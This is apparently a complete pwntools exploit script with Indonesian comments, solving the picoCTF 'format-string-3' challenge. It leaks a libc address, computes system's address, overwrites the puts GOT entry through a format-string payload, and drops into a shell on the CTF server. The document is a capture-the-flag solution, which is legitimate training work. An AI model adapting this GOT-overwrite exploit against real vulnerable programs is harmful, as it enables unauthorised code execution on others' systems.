from pwn import *

# Konfigurasi target (CEK PORT DI WEB PICO KAMU LAGI!)
host = "rhea.picoctf.net"
port = 60855 # Ganti kalau port di instance web-mu beda

# Load file lokal
elf = context.binary = ELF('./format-string-3', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# Koneksi ke server
p = remote(host, port)

# 1. Tangkap Leak (Mencari alamat setvbuf di memori server)
p.recvuntil(b"setvbuf in libc: ")
setvbuf_leak = int(p.recvline().strip(), 16)
log.success(f"Dapat leak setvbuf: {hex(setvbuf_leak)}")

# 2. Hitung alamat System
# Kita cari 'base address' libc dulu, baru cari posisi 'system'
libc.address = setvbuf_leak - libc.symbols['setvbuf']
system_addr = libc.symbols['system']
log.info(f"Libc Base: {hex(libc.address)}")
log.info(f"System Addr: {hex(system_addr)}")

# 3. Payload Overwrite GOT
# Kita kasih tau pwntools: "Cari posisi input saya (offset 38), 
# lalu ganti isi alamat 'puts' di GOT menjadi alamat 'system'"
payload = fmtstr_payload(38, {elf.got['puts']: system_addr})

# 4. Kirim dan ambil Shell
p.sendline(payload)
p.interactive()